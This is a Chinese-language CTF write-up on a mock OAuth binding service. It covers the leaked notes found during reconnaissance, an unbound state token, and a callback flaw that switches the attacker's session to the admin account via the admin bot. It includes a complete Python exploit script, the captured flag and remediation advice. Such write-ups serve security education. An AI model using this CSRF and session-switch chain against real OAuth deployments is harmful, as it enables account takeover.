# Mock OAuth 认证服务 —— CTF Writeup

| 项目 | 内容 |
|------|------|
| 题目类型 | OAuth 绑定流程 CSRF + 回调会话切换逻辑缺陷（账号接管） |
| 技术栈 | FastAPI（/docs、/openapi.json 暴露）、Session Cookie 认证 |
| 目标地址 | `https://eci-2ze4amkgg5jzdukjphp6.cloudeci1.ichunqiu.com:8000` |
| FLAG | `flag{5d3929e7-f2ab-411e-8c49-a30d07d45f3d}` |

---

## 一、题目概述

题目模拟 OAuth2 授权码绑定服务，接口如下：

| 接口 | 说明 |
|---|---|
| `POST /register`、`POST /login` | 账号注册 / 密码登录（set-cookie: session_id） |
| `GET /profile` | 查看当前会话用户与角色 |
| `GET /mock_oauth/authorize` | 模拟 OAuth 授权端点，签发 code |
| `POST /mock_oauth/token` | 模拟令牌端点，code → access_token |
| `GET /bind/start` | 发起 OAuth 绑定（需登录），302 到 authorize 并携带 state |
| `GET /bind/callback` | 处理授权回调（code + state） |
| `GET /admin/visit?url=` | 管理员机器人携带固定管理员会话访问本机 URL（不跟随重定向、不回传响应体） |
| `GET /flag` | 读 flag（需管理员角色） |
| `GET /admin/note` | 管理员笔记（未授权可访问） |
| `GET /backup/flag.txt` | 备份文件（实际 404，干扰项） |

---

## 二、信息收集

1. 首页 HTML 注释泄露开发者备注：

```html
<!--
  开发者遗留备注（上线前清理）
  [2026-08-02] 管理员初始化密码记录在 /admin/note
  [2026-08-03] flag 已同步备份至 /backup/flag.txt
-->
```

2. `GET /admin/note` 无需认证，返回 `{"note":"管理员初始化密码：Admin@2026!（请勿外传）"}`
3. 用 `admin / Admin@2026!` 登录 → `{"msg":"bad credential"}`（密码已被修改，此路不通）
4. `GET /backup/flag.txt` → 404；`GET /flag` → `{"msg":"forbidden"}`（需管理员）

---

## 三、漏洞分析

### 漏洞 1：state 未与用户会话绑定（CSRF 可重放）

`GET /bind/start`（登录态）返回：

```
302 location: /mock_oauth/authorize?client_id=test&redirect_uri=%2Fbind%2Fcallback&state=<token>
```

state 为 `base64url(JWT)` 一层包裹，解码后 JWT 载荷只有：

```json
{"aud": "oauth:state", "exp": 1789280297}
```

- **不含 session_id / 用户名等任何绑定信息**
- state 只校验「签名正确 + 未过期」，可跨会话重放

### 漏洞 2：authorize/token 端点几乎无校验

- `GET /mock_oauth/authorize` 无需登录即可签发 code（`mock_code_<16hex>`），state 原样回显，redirect_uri 仅校验路径为 `/bind/callback`（存在开放重定向，host 可为 localhost/127.0.0.1/目标域）
- `POST /mock_oauth/token` 只需有效 code，client_id / client_secret 完全被忽略，且 code 可复用

### 漏洞 3（核心）：/bind/callback 会话切换逻辑缺陷

对 `GET /bind/callback?code=C&state=S` 的状态机实测：

| 条件 | 响应 |
|---|---|
| code 无效 | `{"msg":"invalid code"}` |
| state 签名无效 | `{"msg":"invalid state"}` |
| 无会话 + code 身份未绑定 | `{"msg":"not logged in, cannot bind"}` |
| 有会话 + code 身份未绑定 | `{"msg":"bind success"}` —— 当前会话用户绑定该 OAuth 身份 |
| 无会话 + code 身份已绑定给用户 X | `{"msg":"identity owned by X, please login first"}` |
| **有会话 + code 身份已绑定给用户 X** | **`{"msg":"identity owned by X, session switched"}` —— 请求者会话被直接切换为用户 X！** |

第 5 种场景本意是「OAuth 身份已绑定 → 直接以绑定用户身份登录」，但实现上**只校验 code 有效 + state 有效，没有校验「当前会话用户 == 身份所有者」**，任何登录用户拿着别人已绑定的 code 访问 callback，就能把自己的会话切换成对方——完整的会话劫持 / 账号接管。

结合 `/admin/visit` 管理员机器人（携带固定管理员会话访问任意本机 URL），即可完成针对管理员的 CSRF 攻击链。

---

## 四、攻击链复现

```
1. 注册并登录攻击者账号 attker_*
2. GET /bind/start                       → 获得合法 state S
3. GET /mock_oauth/authorize
     ?client_id=test&redirect_uri=/bind/callback&state=S
                                         → 获得合法 code C
4. GET /admin/visit
     ?url=http://127.0.0.1:8000/bind/callback?code=C&state=S
   → 管理员机器人携带管理员会话访问回调，此时 code C 身份未绑定
   → {"msg":"bind success"}（管理员账号绑定到攻击者的 OAuth 身份）
5. 攻击者用自己的会话再次访问 /bind/callback?code=C&state=S
   → 身份已被 admin 绑定
   → {"msg":"identity owned by admin, session switched","user":"admin"}
   → 攻击者会话被切换为管理员会话
6. GET /flag → base64 解码得 flag
```

实际输出：

```
[bot]     {"status":"bot visited"}
[switch]  {"msg":"identity owned by admin, session switched","user":"admin"}
[profile] {"user":"admin","role":"admin"}
[flag]    {"flag":"ZmxhZ3s1ZDM5MjllNy1mMmFiLTQxMWUtOGM0OS1hMzBkMDdkNDVmM2R9"}
```

```bash
$ echo ZmxhZ3s1ZDM5MjllNy1mMmFiLTQxMWUtOGM0OS1hMzBkMDdkNDVmM2R9 | base64 -d
flag{5d3929e7-f2ab-411e-8c49-a30d07d45f3d}
```

---

## 五、利用脚本（Python）

```python
# -*- coding: utf-8 -*-
import requests, urllib.parse, time, base64

requests.packages.urllib3.disable_warnings()
B = "https://eci-2ze4amkgg5jzdukjphp6.cloudeci1.ichunqiu.com:8000"

s = requests.Session(); s.verify = False
u = "attker_%d" % int(time.time())
s.post(B + "/register", data={"username": u, "password": "pw12345"})
s.post(B + "/login", data={"username": u, "password": "pw12345"})

# 1. 获取 state
r = s.get(B + "/bind/start", allow_redirects=False)
st = urllib.parse.parse_qs(urllib.parse.urlparse(r.headers["location"]).query)["state"][0]

# 2. 获取 code
r = s.get(B + "/mock_oauth/authorize",
          params={"client_id": "test", "redirect_uri": "/bind/callback", "state": st},
          allow_redirects=False)
code = urllib.parse.parse_qs(urllib.parse.urlparse(r.headers["location"]).query)["code"][0]

# 3. 管理员机器人访问回调，把 admin 绑定到该 OAuth 身份
cb = "/bind/callback?code=%s&state=%s" % (code, st)
print("[bot]", s.get(B + "/admin/visit", params={"url": "http://127.0.0.1:8000" + cb}).text)

# 4. 攻击者会话切换为 admin
print("[switch]", s.get(B + "/bind/callback", params={"code": code, "state": st}).text)
print("[profile]", s.get(B + "/profile").text)

# 5. 读 flag
flag = s.get(B + "/flag").json()["flag"]
print("FLAG:", base64.b64decode(flag).decode())
```

---

## 六、修复建议

1. **state 绑定会话**：签发 state 时把 session_id / 用户 ID 写入 JWT（`sub` 字段），`/bind/callback` 校验 state 与当前会话一致，防止跨会话重放与 CSRF
2. **会话切换必须显式认证**：「identity owned by X」场景应校验当前会话用户就是 X，或要求重新输入密码确认；绝不根据攻击者可控的 code 静默切换会话
3. **绑定上下文校验**：callback 校验 code 的 client_id、redirect_uri 与 `/bind/start` 发起时一致，code 一次性使用（防重放）
4. **信息泄露治理**：`/admin/note` 加鉴权；初始化密码强制首登修改
5. **机器人加固**：`/admin/visit` 访问敏感回调前剥离会话 Cookie，或对回调类端点加 CSRF Token
